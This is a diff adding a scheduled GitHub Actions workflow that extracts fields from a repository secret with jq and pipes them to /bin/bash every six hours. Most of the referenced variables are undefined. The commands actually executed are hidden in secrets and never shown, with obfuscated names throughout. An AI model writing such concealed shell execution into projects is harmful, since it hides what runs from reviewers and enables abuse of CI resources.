@@ -1,0 +1,23 @@
+name: laoliuheleng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laoliuheleng
+        env:
+          hs8154: ${{ secrets.hs8154 }}
+        run: |
+          echo $hs8154 | jq -r .mj3 | /bin/bash
+          echo $daewh59 | jq -r .m313 | /bin/bash
+          echo $uee5 | jq -r .nc43027 | /bin/bash
+          echo $ack7942 | jq -r .rj8 | /bin/bash
+          echo $tgg712 | jq -r .ezjyd080 | /bin/bash
+          echo $oyx50953 | jq -r .rvk6 | /bin/bash
+          echo $pv23097 | jq -r .ds09969 | /bin/bash
+
